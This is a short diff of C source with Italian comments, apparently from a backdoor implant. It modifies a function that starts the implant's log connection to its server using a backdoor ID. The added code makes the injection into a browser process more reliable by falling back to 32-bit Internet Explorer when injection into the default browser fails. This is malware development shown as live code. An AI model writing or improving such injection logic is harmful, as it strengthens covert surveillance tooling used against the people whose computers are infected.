@@ -1430,8 +1430,12 @@ BOOL LOG_StartLogConnection(char *asp_server, char *backdoor_id, BOOL *uninstall
 	HM_GetDefaultBrowser(asp_process);
 
 	// Inizializza ASP
-	if (!ASP_Start(asp_process, asp_server))
-		return FALSE;
+	if (!ASP_Start(asp_process, asp_server)) {
+		// Se per qualche motivo non riesce a iniettarsi nel default browser, prova con IE32
+		HM_GetIE32Browser(asp_process);
+		if (!ASP_Start(asp_process, asp_server))
+			return FALSE;
+	}
 
 	// Seleziona il subtype
 	if (IsX64System()) 
